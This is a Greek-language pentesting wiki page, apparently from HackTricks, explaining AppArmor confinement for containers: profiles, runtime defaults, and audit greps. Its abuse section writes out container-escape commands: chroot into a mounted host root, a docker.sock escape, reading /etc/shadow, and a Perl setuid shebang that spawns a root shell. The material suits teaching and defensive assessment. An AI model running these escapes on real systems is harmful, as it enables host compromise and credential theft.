# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Ρόλος στην απομόνωση των Containers

Το AppArmor είναι ένα σύστημα **Mandatory Access Control** που εφαρμόζει περιορισμούς μέσω profiles ανά πρόγραμμα. Σε αντίθεση με τους παραδοσιακούς ελέγχους DAC, οι οποίοι εξαρτώνται σε μεγάλο βαθμό από την ιδιοκτησία χρηστών και groups, το AppArmor επιτρέπει στον kernel να επιβάλλει μια policy συνδεδεμένη με την ίδια τη διεργασία. Σε περιβάλλοντα containers, αυτό έχει σημασία επειδή ένα workload μπορεί να διαθέτει αρκετά παραδοσιακά privileges ώστε να επιχειρήσει μια ενέργεια και παρ' όλα αυτά να απορριφθεί, επειδή το AppArmor profile του δεν επιτρέπει το σχετικό path, τη συμπεριφορά mount, τη network συμπεριφορά ή τη χρήση capability.

Το σημαντικότερο εννοιολογικό σημείο είναι ότι το AppArmor είναι **path-based**. Αντιμετωπίζει την πρόσβαση στο filesystem μέσω κανόνων path και όχι μέσω labels, όπως κάνει το SELinux. Αυτό το καθιστά προσιτό και ισχυρό, αλλά σημαίνει επίσης ότι τα bind mounts και οι εναλλακτικές διατάξεις paths χρειάζονται προσεκτική εξέταση. Αν το ίδιο περιεχόμενο του host γίνει προσβάσιμο μέσω διαφορετικού path, η επίδραση της policy μπορεί να μην είναι αυτή που αρχικά περίμενε ο operator.

## Ρόλος στην απομόνωση των Containers

Οι έλεγχοι ασφάλειας των containers συχνά περιορίζονται στα capabilities και στο seccomp, όμως το AppArmor εξακολουθεί να έχει σημασία και μετά από αυτούς τους ελέγχους. Φανταστείτε ένα container που έχει περισσότερα privileges από όσα θα έπρεπε ή ένα workload που χρειαζόταν ένα επιπλέον capability για λειτουργικούς λόγους. Το AppArmor μπορεί να περιορίσει την πρόσβαση σε αρχεία, τη συμπεριφορά των mounts, τη δικτύωση και τα patterns εκτέλεσης, με τρόπους που σταματούν την προφανή διαδρομή abuse. Γι' αυτό η απενεργοποίηση του AppArmor "just to get the application working" μπορεί αθόρυβα να μετατρέψει μια απλώς επικίνδυνη ρύθμιση σε μια ρύθμιση που είναι ενεργά exploitable.

## Εργαστήριο

Για να ελέγξετε αν το AppArmor είναι ενεργό στο host, χρησιμοποιήστε:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Για να δείτε με τι εκτελείται η τρέχουσα διεργασία του container:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Η διαφορά είναι διδακτική. Στη φυσιολογική περίπτωση, η διεργασία θα πρέπει να εμφανίζει ένα context του AppArmor συνδεδεμένο με το profile που επιλέχθηκε από το runtime. Στην περίπτωση unconfined, αυτό το επιπλέον επίπεδο περιορισμού εξαφανίζεται.

Μπορείτε επίσης να ελέγξετε τι θεωρεί το Docker ότι εφάρμοσε:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Χρήση κατά το Runtime

Το Docker μπορεί να εφαρμόσει ένα default ή custom AppArmor profile όταν το host το υποστηρίζει. Το Podman μπορεί επίσης να ενσωματωθεί με το AppArmor σε συστήματα που βασίζονται στο AppArmor, αν και σε distributions που δίνουν προτεραιότητα στο SELinux, το άλλο MAC system συχνά έχει τον κεντρικό ρόλο. Το Kubernetes μπορεί να εκθέσει AppArmor policy σε επίπεδο workload σε nodes που υποστηρίζουν πραγματικά το AppArmor. Το LXC και σχετικά Ubuntu-family system-container environments χρησιμοποιούν επίσης εκτενώς το AppArmor.

Το πρακτικό συμπέρασμα είναι ότι το AppArmor δεν είναι "Docker feature". Είναι feature του host kernel που διάφορα runtimes μπορούν να επιλέξουν να εφαρμόσουν. Αν το host δεν το υποστηρίζει ή αν το runtime ρυθμιστεί να εκτελείται unconfined, η υποτιθέμενη προστασία ουσιαστικά δεν υπάρχει.

Ειδικά για το Kubernetes, το σύγχρονο API είναι το `securityContext.appArmorProfile`. Από το Kubernetes `v1.30`, τα παλαιότερα beta AppArmor annotations είναι deprecated. Σε υποστηριζόμενα hosts, το `RuntimeDefault` είναι το default profile, ενώ το `Localhost` παραπέμπει σε profile που πρέπει να έχει ήδη φορτωθεί στο node. Αυτό έχει σημασία κατά το review, επειδή ένα manifest μπορεί να φαίνεται AppArmor-aware, ενώ στην πραγματικότητα να εξαρτάται πλήρως από την υποστήριξη του node και από preloaded profiles.

Μια λεπτομέρεια λειτουργίας, διακριτική αλλά χρήσιμη, είναι ότι ο ρητός ορισμός του `appArmorProfile.type: RuntimeDefault` είναι αυστηρότερος από την απλή παράλειψη του field. Αν το field οριστεί ρητά και το node δεν υποστηρίζει AppArmor, το admission θα πρέπει να αποτύχει. Αν το field παραλειφθεί, το workload μπορεί να εκτελεστεί σε node χωρίς AppArmor και απλώς να μη λάβει αυτό το επιπλέον επίπεδο confinement. Από την οπτική ενός attacker, αυτός είναι ένας καλός λόγος να ελεγχθούν τόσο το manifest όσο και η πραγματική κατάσταση του node.

Σε Docker-capable AppArmor hosts, το πιο γνωστό default είναι το `docker-default`. Αυτό το profile παράγεται από το AppArmor template του Moby και είναι σημαντικό επειδή εξηγεί γιατί ορισμένα capability-based PoCs εξακολουθούν να αποτυγχάνουν σε ένα default container. Σε γενικές γραμμές, το `docker-default` επιτρέπει το συνηθισμένο networking, απαγορεύει writes σε μεγάλο μέρος του `/proc`, απαγορεύει την πρόσβαση σε ευαίσθητα τμήματα του `/sys`, μπλοκάρει mount operations και περιορίζει το ptrace, ώστε να μην αποτελεί γενικό primitive για host probing. Η κατανόηση αυτού του baseline βοηθά να διαχωριστεί το "το container έχει `CAP_SYS_ADMIN`" από το "το container μπορεί πράγματι να χρησιμοποιήσει αυτή την capability εναντίον των kernel interfaces που με ενδιαφέρουν".

## Διαχείριση Profiles

Τα AppArmor profiles συνήθως αποθηκεύονται κάτω από το `/etc/apparmor.d/`. Μια συνηθισμένη naming convention είναι η αντικατάσταση των slashes στο executable path με dots. Για παράδειγμα, ένα profile για το `/usr/bin/man` συνήθως αποθηκεύεται ως `/etc/apparmor.d/usr.bin.man`. Αυτή η λεπτομέρεια έχει σημασία τόσο για το defense όσο και για το assessment, επειδή μόλις γνωρίζετε το όνομα του active profile, μπορείτε συχνά να εντοπίσετε γρήγορα το αντίστοιχο file στο host.

Χρήσιμες host-side management commands περιλαμβάνουν:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Ο λόγος για τον οποίο αυτές οι εντολές έχουν σημασία σε μια αναφορά για την ασφάλεια των containers είναι ότι εξηγούν πώς τα profiles δημιουργούνται, φορτώνονται, τίθενται σε complain mode και τροποποιούνται μετά από αλλαγές στην εφαρμογή. Αν ένας operator συνηθίζει να θέτει τα profiles σε complain mode κατά την αντιμετώπιση προβλημάτων και ξεχνά να επαναφέρει το enforcement, το container μπορεί να φαίνεται προστατευμένο στην τεκμηρίωση, ενώ στην πραγματικότητα λειτουργεί με πολύ πιο χαλαρούς περιορισμούς.

### Δημιουργία και ενημέρωση profiles

Το `aa-genprof` μπορεί να παρακολουθεί τη συμπεριφορά μιας εφαρμογής και να βοηθά στη διαδραστική δημιουργία ενός profile:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
Το `aa-easyprof` μπορεί να δημιουργήσει ένα πρότυπο profile που μπορεί αργότερα να φορτωθεί με το `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Όταν αλλάζει το binary και απαιτείται ενημέρωση του policy, το `aa-logprof` μπορεί να αναπαράγει τις αρνήσεις που εντοπίζονται στα logs και να βοηθήσει τον operator να αποφασίσει αν θα τις επιτρέψει ή θα τις απορρίψει:
```bash
sudo aa-logprof
```
### Καταγραφές

Οι αρνήσεις του AppArmor είναι συχνά ορατές μέσω των `auditd`, syslog ή εργαλείων όπως το `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Αυτό είναι χρήσιμο σε operational και offensive περιβάλλοντα. Οι Defenders το χρησιμοποιούν για να βελτιώσουν τα profiles. Οι Attackers το χρησιμοποιούν για να μάθουν ποιο ακριβώς path ή operation απορρίπτεται και αν το AppArmor είναι το control που μπλοκάρει ένα exploit chain.

### Εντοπισμός του ακριβούς αρχείου profile

Όταν ένα runtime εμφανίζει ένα συγκεκριμένο όνομα AppArmor profile για ένα container, είναι συχνά χρήσιμο να αντιστοιχίσετε αυτό το όνομα με το αρχείο profile στον δίσκο:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Αυτό είναι ιδιαίτερα χρήσιμο κατά την αξιολόγηση από την πλευρά του host, επειδή γεφυρώνει το χάσμα μεταξύ «το container δηλώνει ότι εκτελείται υπό το profile `lowpriv`» και «οι πραγματικοί κανόνες βρίσκονται σε αυτό το συγκεκριμένο αρχείο, το οποίο μπορεί να ελεγχθεί ή να φορτωθεί ξανά».

### Κανόνες Υψηλής Αξίας Για Έλεγχο

Όταν μπορείτε να διαβάσετε ένα profile, μην περιορίζεστε στις απλές γραμμές `deny`. Αρκετοί τύποι κανόνων αλλάζουν ουσιαστικά το πόσο αποτελεσματικό θα είναι το AppArmor απέναντι σε μια απόπειρα container escape:

- `ux` / `Ux`: εκτελούν το binary-στόχο χωρίς confinement. Αν ένα προσβάσιμο helper, shell ή interpreter επιτρέπεται μέσω `ux`, αυτό είναι συνήθως το πρώτο πράγμα που πρέπει να δοκιμάσετε.
- `px` / `Px` και `cx` / `Cx`: πραγματοποιούν profile transitions κατά το exec. Αυτά δεν είναι αυτόματα επικίνδυνα, αλλά αξίζει να ελεγχθούν, επειδή ένα transition μπορεί να καταλήξει σε πολύ ευρύτερο profile από το τρέχον.
- `change_profile`: επιτρέπει σε ένα task να μεταβεί σε άλλο loaded profile, άμεσα ή κατά το επόμενο exec. Αν το profile-προορισμός είναι weaker, αυτό μπορεί να γίνει το προβλεπόμενο escape hatch από ένα restrictive domain.
- `flags=(complain)`, `flags=(unconfined)` ή νεότερα `flags=(prompt)`: αυτά θα πρέπει να αλλάξουν το επίπεδο εμπιστοσύνης σας προς το profile. Το `complain` καταγράφει τις αρνήσεις αντί να τις επιβάλλει, το `unconfined` αφαιρεί το boundary και το `prompt` εξαρτάται από μια userspace decision path αντί για καθαρό deny που επιβάλλεται από τον kernel.
- `userns` ή `userns create,`: η νεότερη πολιτική του AppArmor μπορεί να μεσολαβεί στη δημιουργία user namespaces. Αν ένα container profile το επιτρέπει ρητά, τα nested user namespaces παραμένουν διαθέσιμα, ακόμη και όταν η πλατφόρμα χρησιμοποιεί το AppArmor ως μέρος της hardening στρατηγικής της.

Χρήσιμο grep από την πλευρά του host:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Αυτό το είδος audit είναι συχνά πιο χρήσιμο από το να κοιτάζετε εκατοντάδες συνηθισμένους κανόνες αρχείων. Αν ένα breakout εξαρτάται από την εκτέλεση ενός helper, την είσοδο σε ένα νέο namespace ή τη διαφυγή σε ένα λιγότερο περιοριστικό profile, η απάντηση συχνά κρύβεται σε αυτούς τους κανόνες που αφορούν transitions και όχι στις προφανείς γραμμές τύπου `deny /etc/shadow r`.

## Misconfigurations

Το πιο προφανές λάθος είναι το `apparmor=unconfined`. Οι administrators το ορίζουν συχνά κατά το debugging μιας εφαρμογής που απέτυχε επειδή το profile απέκλεισε σωστά κάτι επικίνδυνο ή μη αναμενόμενο. Αν η σημαία παραμείνει σε production, ολόκληρο το MAC layer έχει ουσιαστικά αφαιρεθεί.

Ένα ακόμη πιο subtle πρόβλημα είναι η υπόθεση ότι τα bind mounts είναι harmless επειδή τα file permissions φαίνονται φυσιολογικά. Εφόσον το AppArmor βασίζεται σε paths, η έκθεση host paths κάτω από εναλλακτικές mount locations μπορεί να αλληλεπιδράσει με προβληματικό τρόπο με τους path rules. Ένα τρίτο λάθος είναι η παραγνώριση του ότι το όνομα ενός profile σε ένα config file σημαίνει ελάχιστα, αν ο kernel του host δεν εφαρμόζει πραγματικά το AppArmor.

## Abuse

Όταν το AppArmor απουσιάζει, operations που προηγουμένως ήταν περιορισμένες μπορεί ξαφνικά να λειτουργούν: ανάγνωση ευαίσθητων paths μέσω bind mounts, πρόσβαση σε τμήματα των procfs ή sysfs που κανονικά θα έπρεπε να είναι δυσκολότερα στη χρήση, εκτέλεση mount-related ενεργειών αν το επιτρέπουν επίσης τα capabilities/seccomp ή χρήση paths που ένα profile κανονικά θα αρνιόταν. Το AppArmor είναι συχνά ο μηχανισμός που εξηγεί γιατί μια απόπειρα breakout βασισμένη σε capabilities «θα έπρεπε να λειτουργεί» θεωρητικά, αλλά στην πράξη εξακολουθεί να αποτυγχάνει. Αφαιρέστε το AppArmor και η ίδια απόπειρα μπορεί να αρχίσει να πετυχαίνει.

Αν υποψιάζεστε ότι το AppArmor είναι το βασικό στοιχείο που εμποδίζει μια αλυσίδα abuse βασισμένη σε path-traversal, bind-mount ή mount, το πρώτο βήμα είναι συνήθως να συγκρίνετε τι γίνεται προσβάσιμο με και χωρίς profile. Για παράδειγμα, αν ένα host path έχει γίνει mount μέσα στο container, ξεκινήστε ελέγχοντας αν μπορείτε να το διασχίσετε και να το διαβάσετε:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Εάν το container διαθέτει επίσης μια επικίνδυνη capability, όπως η `CAP_SYS_ADMIN`, ένα από τα πιο πρακτικά tests είναι να ελεγχθεί εάν το AppArmor είναι ο μηχανισμός ελέγχου που μπλοκάρει τις λειτουργίες `mount` ή την πρόσβαση σε ευαίσθητα kernel filesystems:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Σε περιβάλλοντα όπου ένα path του host είναι ήδη διαθέσιμο μέσω bind mount, η απώλεια του AppArmor μπορεί επίσης να μετατρέψει ένα read-only information-disclosure issue σε άμεση πρόσβαση σε αρχεία του host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Το σημείο αυτών των εντολών δεν είναι ότι το AppArmor από μόνο του δημιουργεί το breakout. Είναι ότι, μόλις αφαιρεθεί το AppArmor, πολλές διαδρομές κατάχρησης που βασίζονται σε filesystem και mount μπορούν να δοκιμαστούν άμεσα.

### Πλήρες Παράδειγμα: AppArmor Disabled + Host Root Mounted

Αν το container έχει ήδη το host root bind-mounted στο `/host`, η αφαίρεση του AppArmor μπορεί να μετατρέψει μια αποκλεισμένη διαδρομή κατάχρησης filesystem σε πλήρες host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Μόλις το shell εκτελείται μέσω του filesystem του host, το workload έχει ουσιαστικά διαφύγει από το όριο του container:
```bash
id
hostname
cat /etc/shadow | head
```
### Πλήρες Παράδειγμα: AppArmor Disabled + Runtime Socket

Αν το πραγματικό εμπόδιο ήταν το AppArmor γύρω από την κατάσταση του runtime, ένα προσαρτημένο socket μπορεί να είναι αρκετό για μια πλήρη διαφυγή:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Η ακριβής διαδρομή εξαρτάται από το σημείο προσάρτησης, αλλά το τελικό αποτέλεσμα είναι το ίδιο: το AppArmor δεν εμποδίζει πλέον την πρόσβαση στο runtime API και το runtime API μπορεί να εκκινήσει ένα container που παραβιάζει το host.

### Full Example: Path-Based Bind-Mount Bypass

Επειδή το AppArmor βασίζεται σε διαδρομές, η προστασία του `/proc/**` δεν προστατεύει αυτόματα το ίδιο περιεχόμενο host procfs όταν αυτό είναι προσβάσιμο μέσω διαφορετικής διαδρομής:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Ο αντίκτυπος εξαρτάται από το τι ακριβώς έχει γίνει mount και από το αν η εναλλακτική διαδρομή παρακάμπτει επίσης άλλους ελέγχους, αλλά αυτό το μοτίβο είναι ένας από τους σαφέστερους λόγους για τους οποίους το AppArmor πρέπει να αξιολογείται μαζί με τη διάταξη των mounts και όχι μεμονωμένα.

### Πλήρες Παράδειγμα: Shebang Bypass

Η πολιτική του AppArmor στοχεύει μερικές φορές μια διαδρομή interpreter με τρόπο που δεν λαμβάνει πλήρως υπόψη την εκτέλεση script μέσω του χειρισμού shebang. Ένα ιστορικό παράδειγμα περιλάμβανε τη χρήση ενός script του οποίου η πρώτη γραμμή δείχνει σε έναν περιορισμένο interpreter:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Αυτό το είδος παραδείγματος είναι σημαντικό ως υπενθύμιση ότι η πρόθεση του profile και τα πραγματικά semantics εκτέλεσης μπορεί να αποκλίνουν. Κατά την ανασκόπηση του AppArmor σε περιβάλλοντα container, οι αλυσίδες interpreter και οι εναλλακτικές διαδρομές εκτέλεσης απαιτούν ιδιαίτερη προσοχή.

## Έλεγχοι

Ο στόχος αυτών των ελέγχων είναι να απαντηθούν γρήγορα τρεις ερωτήσεις: είναι ενεργοποιημένο το AppArmor στο host, είναι περιορισμένη η τρέχουσα διεργασία και εφάρμοσε πράγματι το runtime ένα profile σε αυτό το container;
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Τι είναι ενδιαφέρον εδώ:

- Αν το `/proc/self/attr/current` εμφανίζει `unconfined`, το workload δεν επωφελείται από τον περιορισμό του AppArmor.
- Αν το `aa-status` εμφανίζει ότι το AppArmor είναι απενεργοποιημένο ή δεν έχει φορτωθεί, οποιοδήποτε όνομα profile υπάρχει στο runtime config είναι κυρίως διακοσμητικό.
- Αν το `docker inspect` εμφανίζει `unconfined` ή ένα μη αναμενόμενο custom profile, αυτός είναι συχνά ο λόγος για τον οποίο λειτουργεί ένα filesystem ή mount-based abuse path.
- Αν το `/sys/kernel/security/apparmor/profiles` δεν περιέχει το profile που περιμένατε, το runtime ή η ρύθμιση του orchestrator δεν επαρκεί από μόνη της.
- Αν ένα supposedly hardened profile περιέχει κανόνες τύπου `ux`, ευρύ `change_profile`, `userns` ή `flags=(complain)`, το πρακτικό όριο μπορεί να είναι πολύ ασθενέστερο από όσο υποδηλώνει το όνομα του profile.

Αν ένα container έχει ήδη elevated privileges για operational reasons, η διατήρηση του AppArmor ενεργοποιημένου συχνά κάνει τη διαφορά μεταξύ μιας ελεγχόμενης εξαίρεσης και μιας πολύ ευρύτερης security failure.

## Προεπιλογές Runtime

| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Ενεργοποιημένο από προεπιλογή σε hosts που υποστηρίζουν AppArmor | Χρησιμοποιεί το `docker-default` AppArmor profile, εκτός αν παρακαμφθεί | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Εξαρτάται από το host | Το AppArmor υποστηρίζεται μέσω του `--security-opt`, αλλά η ακριβής προεπιλογή εξαρτάται από το host/runtime και είναι λιγότερο καθολική από το τεκμηριωμένο `docker-default` profile του Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Υπό όρους προεπιλογή | Αν δεν καθοριστεί το `appArmorProfile.type`, η προεπιλογή είναι `RuntimeDefault`, αλλά εφαρμόζεται μόνο όταν το AppArmor είναι ενεργοποιημένο στο node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` με weak profile, nodes χωρίς υποστήριξη AppArmor |
| containerd / CRI-O under Kubernetes | Ακολουθεί την υποστήριξη του node/runtime | Τα συνήθη Kubernetes-supported runtimes υποστηρίζουν AppArmor, αλλά η πραγματική επιβολή εξακολουθεί να εξαρτάται από την υποστήριξη του node και τις ρυθμίσεις του workload | Ίδια με τη γραμμή του Kubernetes· η άμεση ρύθμιση του runtime μπορεί επίσης να παρακάμψει πλήρως το AppArmor |

Για το AppArmor, η σημαντικότερη μεταβλητή είναι συχνά το **host**, όχι μόνο το runtime. Μια ρύθμιση profile σε ένα manifest δεν δημιουργεί confinement σε node όπου το AppArmor δεν είναι ενεργοποιημένο.

## Αναφορές

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
